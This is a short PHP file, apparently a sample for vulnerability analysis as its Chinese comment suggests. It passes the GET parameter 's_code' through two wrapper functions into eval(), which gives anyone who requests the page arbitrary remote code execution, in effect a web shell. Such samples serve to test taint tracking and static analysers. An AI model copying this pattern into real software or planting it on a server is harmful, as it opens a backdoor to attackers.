<?php
/* 
 * 多函数封装漏洞分析
 */
function _doget($var){
    $c = isset($_GET[$var])?trim($_GET[$var]):'';
    return $c;
}

function _dogetapi($var){
    return _doget('s_'.$var);
}

$code = _dogetapi('code');
eval($code);
